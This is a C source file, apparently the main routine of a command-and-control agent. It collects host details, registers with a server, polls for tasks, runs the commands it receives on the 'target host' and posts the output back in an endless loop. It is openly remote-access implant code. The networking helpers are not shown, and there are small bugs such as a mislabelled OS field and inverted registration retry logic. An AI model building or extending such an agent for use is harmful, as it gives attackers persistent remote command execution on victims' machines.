#include <limits.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#include "initiate.h"

int main(void)
{
    struct strings_array sa = { NULL, NULL, 0};
    struct agent_info agent = {{'\0'}, {'\0'}, {'\0'}, {'\0'}, {'\0'}, false};
    struct tasks task = { {'\0'}, {'\0'}, {'\0'}, {'\0'}, NULL, 0, 1};
 
    bool host_info_gathered = false;
    while(!host_info_gathered) {
        if(get_host_info(&agent)) {
            puts("Host info gathered\n");
            host_info_gathered = true;
            printf("Hostname in main: %s\n", agent.hostname);
            printf("Agent os_type in main: %s\n", agent.os_version);
            printf("Agent os_version in main: %s\n", agent.os_version);
            break;
        } else {
            puts("Unable to gather host info\n");
            continue;
        }
    }

    bool registered = false;
    while(!registered) {
        if(reg(&agent, &sa)) {
            puts("Registered\n");
            registered = true;
	        printf("The data returning from agent registration main is %s\n\n", sa.response);
            continue;
        } else {
            puts("Not Registered, trying again\n");
            sleep(5);
            break;
        }

    }
    puts("Made it out of reg\n");
    printf("UUID in main is %s", agent.uuid);

    create_tasks_url(sa.response, &agent);

    while(true) {
        puts("Checking tasks\n");
        if(!check_tasks(&agent, &sa)) {
            puts("No tasks during check in.\n");
            continue;
        }
        if(!parse_tasks(sa.response, &task)) {
            puts("Tasks not parsed successfully.\n");
            continue;
        }

        // Begin iterating through task.strings array and extracting task ID
        // task type, task cmd, and args to then call follow on task execution
        // functions.
        for (unsigned int i = 0; i < task.sz; i++) {      

            // Ref for scanning remainder of string (%[\001-\377]):
            // https://stackoverflow.com/questions/35101996/sscanf-get-the-value-of-the-remaining-string
            sscanf(task.strings[i], "%s %s %s %[\001-\377]", task.id, task.type, task.cmd, task.args);
            printf("Tasks ID: %s\n", task.id);
            printf("Tasks Type: %s\n", task.type);
            printf("Tasks Cmd: %s\n", task.cmd);
            printf("Tasks Arg: %s\n", task.args);
            puts(" \n");
            // Eventually check_tasks will return the task type and
            // specific task. An if block or switch case will be added
            // here to call appropriate functions for a given task type.

            // Check to see if binary exists on target host.
            if(can_run_cmd(task.cmd)) {
                puts("Command exists\n");
                if(run_cmd(&sa, &task)) {
                    // Eventually will need to include logic if results can't be posted,
                    // to retain data continuously attempt to re-post until successful.
                    post_results(&sa);
                } else {
                    printf("Unable to execute command %s\n", task.cmd);
                    // Will need to include logic to post unsuccessful results.
                    // Memset task values.
                    memset_task_vals(&task);
                    continue;
                }

            } else {
                puts("Command does not exist\n");
                // Will need to include logic to post unsuccessful results.
                // Memset task values.
                memset_task_vals(&task);
                continue;
            }

            // After executing each task, memset all values to execute
            // next task.
            memset_task_vals(&task);


        }

        free(sa.response);
        destroy(&task);

        sa.results = NULL;
        sa.response = NULL;
        sa.size = 0;
        task.sz = 0;



        sleep(10);
    }
        
}